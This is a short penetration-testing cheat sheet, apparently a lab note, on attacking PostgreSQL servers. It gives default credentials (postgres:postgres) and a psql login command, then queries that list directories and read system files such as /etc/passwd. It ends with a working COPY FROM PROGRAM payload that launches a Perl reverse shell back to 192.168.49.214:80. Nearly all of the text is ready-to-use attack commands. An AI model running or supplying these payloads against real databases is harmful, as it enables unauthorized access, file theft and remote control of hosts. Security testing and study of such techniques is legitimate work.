# PostgreSQL (5432,5433,5437)

---

### 1) PostgreSQL Enumeration

Default/weak credentials:
- try default postgresql credentials `postgres:postgres`
- i.e. `psql -U postgres -p 5437 -h 192.168.214.47 -> [postgres]`

Enumerating information:
> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
- version: `SELECT version();`
- list current directory: `select pg_ls_dir('.');`
- read a file: `select pg_read_file('/etc/passwd');`
- list a directory: `select pg_ls_dir('/home/wilson');`


<br>

--- 

### 2) PostgreSQL Exploitation

Create reverse shell:
```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.49.214:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
